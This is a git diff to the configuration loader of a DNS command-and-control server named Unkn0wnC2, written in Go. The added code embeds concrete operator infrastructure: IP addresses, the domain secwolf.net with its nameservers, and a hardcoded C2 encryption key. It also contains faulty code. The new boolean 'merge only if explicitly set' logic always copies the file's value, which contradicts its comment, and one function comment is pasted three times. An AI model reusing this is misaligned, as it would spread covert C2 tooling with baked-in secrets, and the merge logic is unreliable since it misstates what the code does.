@@ -1,3 +1,6 @@
+// Package main implements configuration management for the Unkn0wnC2 DNS C2 server.
+// This file handles loading configuration from JSON files, environment variables,
+// and embedded build-time configuration.
 package main
 
 import (
@@ -30,6 +33,8 @@ type Config struct {
 }
 
 // DefaultConfig returns sensible defaults for local development.
+// DefaultConfig returns a Config struct with default values for all settings,
+// providing a baseline configuration for the DNS C2 server.
 func DefaultConfig() Config {
 	return Config{
 		BindAddr:      "0.0.0.0",
@@ -47,9 +52,19 @@ func DefaultConfig() Config {
 
 // LoadConfig attempts to load configuration from a JSON file.
 // If DNS_CONFIG env var is set, it will use that path; otherwise "config.json" in cwd.
-// Missing or partial files fall back to defaults.
+// Missing or partial files fall back to defaults or embedded config if available.
+// LoadConfig loads configuration from embedded data (build-time) or config.json file,
+// with environment variable overrides and validation of required settings.
 func LoadConfig() (Config, error) {
-	cfg := DefaultConfig()
+	var cfg Config
+
+	// Try to load embedded configuration first (if available from build)
+	if embeddedConfig, hasEmbedded := tryLoadEmbeddedConfig(); hasEmbedded {
+		cfg = embeddedConfig
+	} else {
+		// Fall back to defaults if no embedded config
+		cfg = DefaultConfig()
+	}
 
 	path := os.Getenv("DNS_CONFIG")
 	if path == "" {
@@ -59,7 +74,7 @@ func LoadConfig() (Config, error) {
 	data, err := os.ReadFile(path)
 	if err != nil {
 		if errors.Is(err, os.ErrNotExist) {
-			// No file present: return defaults
+			// No file present: return base config (embedded or defaults)
 			return cfg, nil
 		}
 		return cfg, fmt.Errorf("open config: %w", err)
@@ -70,12 +85,15 @@ func LoadConfig() (Config, error) {
 		return cfg, fmt.Errorf("decode config: %w", err)
 	}
 
-	// Merge: only overwrite defaults if provided
+	// Merge: only overwrite base config if provided in file
 	if fileCfg.BindAddr != "" {
 		cfg.BindAddr = fileCfg.BindAddr
 	}
 	if fileCfg.BindPort != 0 {
 		cfg.BindPort = fileCfg.BindPort
+	}
+	if fileCfg.SvrAddr != "" {
+		cfg.SvrAddr = fileCfg.SvrAddr
 	}
 	if fileCfg.Domain != "" {
 		cfg.Domain = fileCfg.Domain
@@ -86,9 +104,13 @@ func LoadConfig() (Config, error) {
 	if fileCfg.NS2 != "" {
 		cfg.NS2 = fileCfg.NS2
 	}
-	// For boolean fields, use the loaded value (false if not specified)
-	cfg.ForwardDNS = fileCfg.ForwardDNS
-	cfg.Debug = fileCfg.Debug
+	// For boolean fields, use the loaded value only if explicitly set
+	if fileCfg.ForwardDNS != cfg.ForwardDNS {
+		cfg.ForwardDNS = fileCfg.ForwardDNS
+	}
+	if fileCfg.Debug != cfg.Debug {
+		cfg.Debug = fileCfg.Debug
+	}
 	if fileCfg.UpstreamDNS != "" {
 		cfg.UpstreamDNS = fileCfg.UpstreamDNS
 	}
@@ -97,4 +119,29 @@ func LoadConfig() (Config, error) {
 	}
 
 	return cfg, nil
+}
+
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load configuration from embedded build-time data,
+// returning the config and a boolean indicating if embedded data was found.
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+func tryLoadEmbeddedConfig() (Config, bool) {
+	// Embedded configuration from build time
+	embeddedConfig := Config{
+		BindAddr:      "172.26.13.62",
+		BindPort:      53,
+		SvrAddr:       "98.90.218.70",
+		Domain:        "secwolf.net",
+		NS1:           "ns1.secwolf.net",
+		NS2:           "ns2.secwolf.net",
+		ForwardDNS:    true,
+		UpstreamDNS:   "8.8.8.8:53",
+		EncryptionKey: "MySecretC2Key123!@#DefaultChange",
+		Debug:         false,
+	}
+	return embeddedConfig, true
 }
